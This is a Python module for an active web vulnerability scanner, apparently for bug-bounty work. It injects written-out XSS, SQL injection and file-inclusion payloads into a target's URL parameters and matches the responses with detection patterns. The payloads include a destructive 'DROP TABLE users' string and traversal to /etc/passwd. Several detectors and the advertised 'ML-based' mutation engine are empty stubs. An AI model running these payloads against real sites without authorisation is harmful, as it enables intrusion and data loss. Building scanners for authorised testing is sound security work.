"""Vulnerability scanning and detection engine."""

import asyncio
import re
import json
import random
from typing import List, Dict, Any, Set, Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
from loguru import logger

from .base import ActiveScanner, ScanResult, Finding
from ..core.utils import calculate_cvss_score

class VulnerabilityScanner(ActiveScanner):
    """Advanced vulnerability scanner with ML-based payload generation."""
    
    def __init__(self, program_id: int):
        """Initialize vulnerability scanner."""
        super().__init__('vulnerability_scan', program_id)
        
        # Vulnerability detection modules
        self.detectors = {
            'xss': XSSDetector(),
            'sqli': SQLInjectionDetector(),
            'lfi': LocalFileInclusionDetector(),
            'rce': RemoteCodeExecutionDetector(),
            'ssrf': ServerSideRequestForgeryDetector(),
            'ssti': ServerSideTemplateInjectionDetector(),
            'csrf': CSRFDetector(),
            'idor': IDORDetector()
        }
        
        # False positive filters
        self.fp_filters = FalsePositiveFilter()
        
        # Payload mutation engine
        self.mutation_engine = PayloadMutationEngine()
    
    async def scan(self, target: str, **kwargs) -> ScanResult:
        """Perform vulnerability scan on target."""
        import time
        start_time = time.time()
        findings = []
        
        try:
            logger.info(f"Starting vulnerability scan on {target}")
            
            # Parse target URL
            parsed_url = urlparse(target)
            if not parsed_url.scheme:
                target = f"https://{target}"
                parsed_url = urlparse(target)
            
            # Crawl target to find endpoints
            endpoints = await self._crawl_target(target, kwargs.get('crawl_depth', 2))
            logger.info(f"Found {len(endpoints)} endpoints to test")
            
            # Test each endpoint with each detector
            for endpoint in endpoints:
                if not self.running:
                    break
                
                for detector_name, detector in self.detectors.items():
                    if not self.running:
                        break
                    
                    try:
                        # Test endpoint with detector
                        vulns = await detector.detect(endpoint, self)
                        
                        # Filter false positives
                        filtered_vulns = []
                        for vuln in vulns:
                            if not await self.fp_filters.is_false_positive(vuln, endpoint):
                                filtered_vulns.append(vuln)
                        
                        findings.extend(filtered_vulns)
                        
                        # Rate limiting between tests
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                        
                    except Exception as e:
                        logger.error(f"Detector {detector_name} failed on {endpoint}: {e}")
            
            logger.info(f"Vulnerability scan completed: {len(findings)} vulnerabilities found")
            
            return ScanResult(
                target=target,
                scan_type=self.name,
                findings=findings,
                metadata={
                    'endpoints_tested': len(endpoints),
                    'detectors_used': list(self.detectors.keys())
                },
                success=True,
                duration=time.time() - start_time
            )
            
        except Exception as e:
            logger.error(f"Vulnerability scan failed: {e}")
            return ScanResult(
                target=target,
                scan_type=self.name,
                success=False,
                error=str(e),
                duration=time.time() - start_time
            )
    
    async def _crawl_target(self, target: str, depth: int) -> Set[str]:
        """Crawl target to discover endpoints."""
        endpoints = set()
        visited = set()
        to_visit = [target]
        
        for current_depth in range(depth):
            if not to_visit or not self.running:
                break
            
            current_level = to_visit.copy()
            to_visit.clear()
            
            for url in current_level:
                if url in visited or not self.running:
                    continue
                
                visited.add(url)
                endpoints.add(url)
                
                try:
                    # Get page content
                    response = await self.make_request(url)
                    if not response or response['status'] != 200:
                        continue
                    
                    # Parse HTML to find links
                    if 'text/html' in response.get('headers', {}).get('content-type', ''):
                        soup = BeautifulSoup(response['data'], 'html.parser')
                        
                        # Find links
                        for link in soup.find_all(['a', 'form'], href=True):
                            href = link.get('href') or link.get('action', '')
                            if href:
                                absolute_url = urljoin(url, href)
                                
                                # Only crawl same domain
                                if urlparse(absolute_url).netloc == urlparse(target).netloc:
                                    to_visit.append(absolute_url)
                    
                except Exception as e:
                    logger.debug(f"Failed to crawl {url}: {e}")
                
                # Rate limiting
                await asyncio.sleep(random.uniform(0.1, 0.3))
        
        return endpoints

class BaseDetector:
    """Base class for vulnerability detectors."""
    
    def __init__(self, name: str):
        """Initialize detector."""
        self.name = name
        self.payloads = []
        self.signatures = []
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        """Detect vulnerabilities in endpoint."""
        raise NotImplementedError

class XSSDetector(BaseDetector):
    """Cross-site scripting detector."""
    
    def __init__(self):
        """Initialize XSS detector."""
        super().__init__('xss')
        
        # XSS payloads
        self.payloads = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            '"><script>alert("xss")</script>',
            "javascript:alert('xss')",
            '<svg/onload=alert("xss")>',
            '<iframe src="javascript:alert(`xss`)">',
            '<body onload=alert("xss")>',
            '<input autofocus onfocus=alert("xss")>',
            '<select autofocus onfocus=alert("xss")>',
            '<textarea autofocus onfocus=alert("xss")>',
            '\'-alert("xss")-\'',
            '\";alert("xss");//',
            '<script>console.log("xss")</script>',
            '<script src="data:text/javascript,alert(`xss`)">',
        ]
        
        # Detection signatures
        self.signatures = [
            r'<script[^>]*>.*?alert\s*\(',
            r'<script[^>]*>.*?console\.log',
            r'<img[^>]*onerror\s*=',
            r'<svg[^>]*onload\s*=',
            r'<iframe[^>]*src\s*=\s*["\']javascript:',
            r'javascript:\s*alert\s*\(',
            r'<body[^>]*onload\s*=',
        ]
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        """Detect XSS vulnerabilities."""
        findings = []
        
        try:
            # Parse URL to get parameters
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            if not params:
                return findings
            
            # Test each parameter
            for param_name, param_values in params.items():
                for payload in self.payloads:
                    if not scanner.running:
                        break
                    
                    # Create test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    # Send request
                    response = await scanner.make_request(test_url)
                    if not response:
                        continue
                    
                    # Check for reflected payload
                    response_text = str(response.get('data', ''))
                    
                    # Check for exact reflection
                    if payload in response_text:
                        # Verify it's actually executable XSS
                        if self._verify_xss(payload, response_text):
                            confidence = self._calculate_xss_confidence(payload, response_text)
                            
                            finding = Finding(
                                title=f"Reflected XSS in parameter '{param_name}'",
                                description=f"Cross-site scripting vulnerability found in parameter '{param_name}' at {endpoint}",
                                severity="high",
                                confidence=confidence,
                                url=test_url,
                                vulnerability_type="xss",
                                parameter=param_name,
                                payload=payload,
                                cvss_score=calculate_cvss_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
                                evidence={
                                    'payload': payload,
                                    'parameter': param_name,
                                    'reflection_context': self._get_reflection_context(payload, response_text),
                                    'response_snippet': response_text[:500]
                                }
                            )
                            findings.append(finding)
                            break  # Found XSS, no need to test more payloads for this param
                    
                    # Rate limiting
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.error(f"XSS detection failed for {endpoint}: {e}")
        
        return findings
    
    def _verify_xss(self, payload: str, response: str) -> bool:
        """Verify that reflected content is actually executable XSS."""
        # Check if payload is in executable context
        for signature in self.signatures:
            if re.search(signature, response, re.IGNORECASE):
                return True
        
        # Check if payload is not properly encoded
        dangerous_chars = ['<', '>', '"', "'", '&']
        for char in dangerous_chars:
            if char in payload and char in response:
                return True
        
        return False
    
    def _calculate_xss_confidence(self, payload: str, response: str) -> float:
        """Calculate confidence score for XSS detection."""
        confidence = 0.5
        
        # Higher confidence for script tags
        if '<script' in response.lower():
            confidence += 0.3
        
        # Higher confidence for event handlers
        if re.search(r'on\w+\s*=', response, re.IGNORECASE):
            confidence += 0.2
        
        # Lower confidence if HTML encoded
        if '&lt;' in response or '&gt;' in response:
            confidence -= 0.2
        
        return min(1.0, max(0.0, confidence))
    
    def _get_reflection_context(self, payload: str, response: str) -> str:
        """Get context where payload is reflected."""
        index = response.find(payload)
        if index == -1:
            return "Not reflected"
        
        start = max(0, index - 50)
        end = min(len(response), index + len(payload) + 50)
        
        return response[start:end]

class SQLInjectionDetector(BaseDetector):
    """SQL injection detector."""
    
    def __init__(self):
        """Initialize SQL injection detector."""
        super().__init__('sqli')
        
        # SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            '" OR 1=1--',
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            '" AND pg_sleep(5)--',
            "' OR 1=1#",
            '" OR 1=1#',
            "1' OR '1'='1",
            '1" OR "1"="1',
            "admin'--",
            'admin"--',
            "' OR 'a'='a",
            '" OR "a"="a'
        ]
        
        # Error signatures
        self.error_signatures = [
            r'mysql.*error',
            r'postgresql.*error',
            r'oracle.*error',
            r'sqlite.*error',
            r'syntax error.*query',
            r'unterminated quoted string',
            r'incorrect syntax near',
            r'quoted string not properly terminated',
            r'ORA-\d+',
            r'MySQL server version',
            r'Microsoft.*ODBC.*SQL',
            r'Warning: mysql_',
            r'Warning: pg_',
            r'SQLState.*:\s+\d+'
        ]
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        """Detect SQL injection vulnerabilities."""
        findings = []
        
        try:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            if not params:
                return findings
            
            # Test each parameter
            for param_name, param_values in params.items():
                for payload in self.payloads:
                    if not scanner.running:
                        break
                    
                    # Create test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    # Send request and measure response time
                    import time
                    start_time = time.time()
                    response = await scanner.make_request(test_url)
                    response_time = time.time() - start_time
                    
                    if not response:
                        continue
                    
                    response_text = str(response.get('data', ''))
                    
                    # Check for SQL errors
                    for error_pattern in self.error_signatures:
                        if re.search(error_pattern, response_text, re.IGNORECASE):
                            finding = Finding(
                                title=f"SQL Injection in parameter '{param_name}'",
                                description=f"SQL injection vulnerability detected in parameter '{param_name}' at {endpoint}",
                                severity="critical",
                                confidence=0.85,
                                url=test_url,
                                vulnerability_type="sqli",
                                parameter=param_name,
                                payload=payload,
                                cvss_score=calculate_cvss_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
                                evidence={
                                    'payload': payload,
                                    'parameter': param_name,
                                    'error_pattern': error_pattern,
                                    'error_snippet': self._extract_error(response_text, error_pattern)
                                }
                            )
                            findings.append(finding)
                            break
                    
                    # Check for time-based SQL injection
                    if 'SLEEP' in payload.upper() or 'pg_sleep' in payload.lower():
                        if response_time > 4:  # Expecting ~5 second delay
                            finding = Finding(
                                title=f"Time-based SQL Injection in parameter '{param_name}'",
                                description=f"Time-based SQL injection vulnerability detected in parameter '{param_name}' at {endpoint}",
                                severity="critical",
                                confidence=0.9,
                                url=test_url,
                                vulnerability_type="sqli",
                                parameter=param_name,
                                payload=payload,
                                cvss_score=calculate_cvss_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
                                evidence={
                                    'payload': payload,
                                    'parameter': param_name,
                                    'response_time': response_time,
                                    'expected_delay': 5
                                }
                            )
                            findings.append(finding)
                    
                    await asyncio.sleep(0.2)  # Rate limiting
        
        except Exception as e:
            logger.error(f"SQL injection detection failed for {endpoint}: {e}")
        
        return findings
    
    def _extract_error(self, response: str, pattern: str) -> str:
        """Extract error message from response."""
        match = re.search(pattern, response, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 50)
            end = min(len(response), match.end() + 50)
            return response[start:end]
        return ""

class LocalFileInclusionDetector(BaseDetector):
    """Local file inclusion detector."""
    
    def __init__(self):
        """Initialize LFI detector."""
        super().__init__('lfi')
        
        # LFI payloads
        self.payloads = [
            '../etc/passwd',
            '..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'php://filter/convert.base64-encode/resource=../etc/passwd',
            'file:///etc/passwd',
            '../../../etc/passwd%00',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00'
        ]
        
        # File content signatures
        self.file_signatures = [
            (r'root:.*:/bin/.*sh', '/etc/passwd'),
            (r'# Copyright.*Microsoft Corp', 'hosts file'),
            (r'127\.0\.0\.1\s+localhost', 'hosts file'),
            (r'daemon:.*:/bin/sh', '/etc/passwd'),
            (r'# localhost name resolution', 'hosts file')
        ]
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        """Detect LFI vulnerabilities."""
        findings = []
        
        try:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            if not params:
                return findings
            
            # Test each parameter
            for param_name, param_values in params.items():
                for payload in self.payloads:
                    if not scanner.running:
                        break
                    
                    # Create test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    # Send request
                    response = await scanner.make_request(test_url)
                    if not response:
                        continue
                    
                    response_text = str(response.get('data', ''))
                    
                    # Check for file content signatures
                    for pattern, file_type in self.file_signatures:
                        if re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE):
                            finding = Finding(
                                title=f"Local File Inclusion in parameter '{param_name}'",
                                description=f"Local file inclusion vulnerability detected in parameter '{param_name}' at {endpoint}",
                                severity="high",
                                confidence=0.9,
                                url=test_url,
                                vulnerability_type="lfi",
                                parameter=param_name,
                                payload=payload,
                                cvss_score=calculate_cvss_score("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
                                evidence={
                                    'payload': payload,
                                    'parameter': param_name,
                                    'file_type': file_type,
                                    'file_content_snippet': self._extract_file_content(response_text, pattern)
                                }
                            )
                            findings.append(finding)
                            break
                    
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.error(f"LFI detection failed for {endpoint}: {e}")
        
        return findings
    
    def _extract_file_content(self, response: str, pattern: str) -> str:
        """Extract file content from response."""
        match = re.search(pattern, response, re.IGNORECASE | re.MULTILINE)
        if match:
            lines = response.split('\n')
            for i, line in enumerate(lines):
                if re.search(pattern, line, re.IGNORECASE):
                    start = max(0, i - 2)
                    end = min(len(lines), i + 3)
                    return '\n'.join(lines[start:end])
        return ""

# Additional detector classes would be implemented here...
class RemoteCodeExecutionDetector(BaseDetector):
    """Remote code execution detector (placeholder)."""
    
    def __init__(self):
        super().__init__('rce')
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        return []  # Placeholder implementation

class ServerSideRequestForgeryDetector(BaseDetector):
    """SSRF detector (placeholder)."""
    
    def __init__(self):
        super().__init__('ssrf')
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        return []  # Placeholder implementation

class ServerSideTemplateInjectionDetector(BaseDetector):
    """SSTI detector (placeholder)."""
    
    def __init__(self):
        super().__init__('ssti')
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        return []  # Placeholder implementation

class CSRFDetector(BaseDetector):
    """CSRF detector (placeholder)."""
    
    def __init__(self):
        super().__init__('csrf')
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        return []  # Placeholder implementation

class IDORDetector(BaseDetector):
    """IDOR detector (placeholder)."""
    
    def __init__(self):
        super().__init__('idor')
    
    async def detect(self, endpoint: str, scanner: ActiveScanner) -> List[Finding]:
        return []  # Placeholder implementation

class FalsePositiveFilter:
    """Filter to reduce false positives."""
    
    async def is_false_positive(self, finding: Finding, endpoint: str) -> bool:
        """Check if finding is likely a false positive."""
        # Implement false positive detection logic
        return False  # Placeholder

class PayloadMutationEngine:
    """Engine for generating mutated payloads."""
    
    def generate_mutations(self, base_payload: str) -> List[str]:
        """Generate mutated versions of payload."""
        return [base_payload]  # Placeholder